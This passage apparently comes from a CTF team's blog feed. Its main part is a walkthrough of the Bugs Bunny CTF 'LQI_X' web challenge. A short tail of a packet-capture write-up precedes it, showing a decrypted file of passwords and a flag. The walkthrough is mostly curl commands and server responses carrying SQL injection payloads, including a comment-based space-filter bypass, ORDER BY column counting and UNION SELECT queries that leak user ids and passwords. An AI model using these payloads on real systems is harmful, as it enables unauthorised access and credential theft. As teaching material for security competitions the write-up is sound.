<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; unzip secret.zip </div><div class="line">Archive:  secret.zip</div><div class="line">[secret.zip] secret.txt password: </div><div class="line">  inflating: secret.txt              </div><div class="line">  inflating: hamburger_pussy.jpg</div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; cat secret.txt </div><div class="line">Important passwords:</div><div class="line">secret.zip  Pyj4m4P4rtY@2017</div><div class="line">root    Welcome123</div><div class="line">flag          flag&#123;bf107b7f64f320034df7e48669439f69&#125;</div></pre></td></tr></table></figure>
<p>Finally the flag was flag{bf107b7f64f320034df7e48669439f69}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Abuse Mail (300) - 62 solves&lt;br&gt;Our abuse desk received an mail that someone from our network has hacked their company. 
    
    </summary>
    
      <category term="Network" scheme="https://teamrocketist.github.io/categories/Network/"/>
    
    
      <category term="pcap" scheme="https://teamrocketist.github.io/tags/pcap/"/>
    
      <category term="wireshark" scheme="https://teamrocketist.github.io/tags/wireshark/"/>
    
      <category term="usb" scheme="https://teamrocketist.github.io/tags/usb/"/>
    
      <category term="network" scheme="https://teamrocketist.github.io/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Bugs Bunny CTF - LQI_X 140</title>
    <link href="https://teamrocketist.github.io/2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/"/>
    <id>https://teamrocketist.github.io/2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/</id>
    <published>2017-08-02T10:29:58.000Z</published>
    <updated>2017-08-10T02:57:43.109Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>LQI_X<br>140<br><br>Its for your , login and get all you need<br><br>task : <a href="http://34.253.165.46/LQI_X/" target="_blank" rel="external">http://34.253.165.46/LQI_X/</a><br><br>Author: TnMch<br></blockquote>

<p>We have login form so lets start by doing some tests with curl at the GET parameter username:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -L "http://34.253.165.46/LQI_X/?username=test'&amp;password=" -v</div><div class="line">*   Trying 34.253.165.46...</div><div class="line">* TCP_NODELAY set</div><div class="line">* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)</div><div class="line">&gt; GET /LQI_X/?username=test'&amp;password= HTTP/1.1</div><div class="line">&gt; Host: 34.253.165.46</div><div class="line">&gt; User-Agent: curl/7.52.1</div><div class="line">&gt; Accept: */*</div><div class="line">&gt; </div><div class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">1.1</span> <span class="attr">200</span> <span class="attr">OK</span></span></div><div class="line">&lt; Date: Wed, 02 Aug 2017 10:27:30 GMT</div><div class="line"><span class="tag">&lt; <span class="attr">Server:</span> <span class="attr">Apache</span>/<span class="attr">2.4.18</span> (<span class="attr">Ubuntu</span>)</span></div><div class="line">&lt; Vary: Accept-Encoding</div><div class="line"><span class="tag">&lt; <span class="attr">Content-Length:</span> <span class="attr">749</span></span></div><div class="line">&lt; Content-Type: text/html; charset=UTF-8</div><div class="line"><span class="tag">&lt; </span></div><div class="line"><span class="tag"></span></div><div class="line"><span class="tag"></span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>SQLI-F - Log-in<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">href</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery-ui.css'</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/style.css"</span> <span class="attr">media</span>=<span class="string">"screen"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> /&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-card"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Log-in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"login login-submit"</span> <span class="attr">value</span>=<span class="string">"login"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>Nothing seems to be Changing lets try with password:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">curl -L "http://34.253.165.46/LQI_X/?username=test&amp;password=test'%20or%201=1--" -v</div><div class="line">*   Trying 34.253.165.46...</div><div class="line">* TCP_NODELAY set</div><div class="line">* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'%20or%201=1-- HTTP/1.1</div><div class="line">&gt; Host: 34.253.165.46</div><div class="line">&gt; User-Agent: curl/7.52.1</div><div class="line">&gt; Accept: */*</div><div class="line">&gt; </div><div class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">1.1</span> <span class="attr">200</span> <span class="attr">OK</span></span></div><div class="line">&lt; Date: Wed, 02 Aug 2017 10:32:28 GMT</div><div class="line"><span class="tag">&lt; <span class="attr">Server:</span> <span class="attr">Apache</span>/<span class="attr">2.4.18</span> (<span class="attr">Ubuntu</span>)</span></div><div class="line">&lt; Content-Length: 12</div><div class="line"><span class="tag">&lt; <span class="attr">Content-Type:</span> <span class="attr">text</span>/<span class="attr">html</span>; <span class="attr">charset</span>=<span class="string">UTF-8</span></span></div><div class="line">&lt; </div><div class="line">* Curl_http_done: called premature == 0</div><div class="line">* Connection #0 to host 34.253.165.46 left intact</div><div class="line">No way SOrry</div></pre></td></tr></table></figure>
<p>Wow a custom error message? they must be filtering some characters or even words… Maybe its the spaces, lets try to use the comment technique to bypass space filtering:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/or/**/1=1--" -v</div><div class="line">*   Trying 34.253.165.46...</div><div class="line">* TCP_NODELAY set</div><div class="line">* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/or/**/1=1-- HTTP/1.1</div><div class="line">&gt; Host: 34.253.165.46</div><div class="line">&gt; User-Agent: curl/7.52.1</div><div class="line">&gt; Accept: */*</div><div class="line">&gt; </div><div class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">1.1</span> <span class="attr">200</span> <span class="attr">OK</span></span></div><div class="line">&lt; Date: Wed, 02 Aug 2017 10:37:24 GMT</div><div class="line"><span class="tag">&lt; <span class="attr">Server:</span> <span class="attr">Apache</span>/<span class="attr">2.4.18</span> (<span class="attr">Ubuntu</span>)</span></div><div class="line">&lt; Vary: Accept-Encoding</div><div class="line"><span class="tag">&lt; <span class="attr">Content-Length:</span> <span class="attr">753</span></span></div><div class="line">&lt; Content-Type: text/html; charset=UTF-8</div><div class="line"><span class="tag">&lt; </span></div><div class="line"><span class="tag"></span></div><div class="line"><span class="tag"></span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>SQLI-F - Log-in<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">href</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery-ui.css'</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/style.css"</span> <span class="attr">media</span>=<span class="string">"screen"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> /&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-card"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Log-in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"login login-submit"</span> <span class="attr">value</span>=<span class="string">"login"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> test<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>It works! now lets use <b>order by</b> to see how many values are returned to know how many columns we will use on our union query injection. Using CURL with <b>I</b> option to check the status code from the request so if the query returns an error we will get a 500 (Internal Error) if not we get a 200 (OK)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -I "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/order/**/by/**/1--"</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Wed, 02 Aug 2017 10:43:01 GMT</div><div class="line">Server: Apache/2.4.18 (Ubuntu)</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line"></div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -I "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/order/**/by/**/2--"</div><div class="line">HTTP/1.0 500 Internal Server Error</div><div class="line">Date: Wed, 02 Aug 2017 10:43:03 GMT</div><div class="line">Server: Apache/2.4.18 (Ubuntu)</div><div class="line">Connection: close</div><div class="line">Content-Type: text/html; charset=UTF-8</div></pre></td></tr></table></figure>
<p>As we can see the sql query is only selecting one column the real query must be something similar to this “Select username from table_users where username=%s and password=%s”. Now injecting with union:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/1--"</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>SQLI-F - Log-in<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">href</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery-ui.css'</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/style.css"</span> <span class="attr">media</span>=<span class="string">"screen"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> /&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-card"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Log-in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"login login-submit"</span> <span class="attr">value</span>=<span class="string">"login"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>It worked! as you can see at the image above the number “1” showed up now what I tryed after this was getting the table names from information_schema but somehow I wasn’t able to do it so I tried to guess the obvious names, assumed that the table name is users and the columns probably id,username and password.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/0,1-- HTTP/1.1</div><div class="line">... </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/1,1--"</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/1,1-- HTTP/1.1</div><div class="line">... </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/2,1--"</div><div class="line">* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/2,1-- HTTP/1.1</div><div class="line">... </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/3,1--"</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/3,1-- HTTP/1.1</div><div class="line">... </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 4<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/4,1--"</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/4,1-- HTTP/1.1</div><div class="line">... </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 5<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div></pre></td></tr></table></figure>
<p>As we can see we were successful to leak the ids from the users now lets try with the password</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/0,1--"</div><div class="line">....</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> _Easy_I_Dont_Think<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">....</div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/1,1--"</div><div class="line">....</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">....</div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/2,1--"</div><div class="line">....</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> here<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">....</div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/3,1--"</div><div class="line">....</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> test<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">....</div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/4,1--"</div><div class="line">....</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> &#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">....</div></pre></td></tr></table></figure>
